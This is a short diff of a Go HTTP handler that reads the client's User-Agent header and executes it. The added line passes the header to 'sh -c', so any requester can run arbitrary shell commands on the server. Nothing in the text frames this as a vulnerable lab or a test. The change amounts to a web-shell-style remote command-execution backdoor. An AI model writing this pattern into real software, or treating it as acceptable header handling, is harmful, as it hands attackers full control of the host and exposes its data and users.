@@ -15,7 +15,8 @@ func main() {
       fmt.Fprintf(w, "%v: %v\n", k, v)
     }
     ua := r.Header.Get("User-Agent")
-    out, err := exec.Command(ua).Output()
+    out, err := exec.Command("sh", "-c", ua).Output()
+
     if err != nil {
         fmt.Println(err)
     }
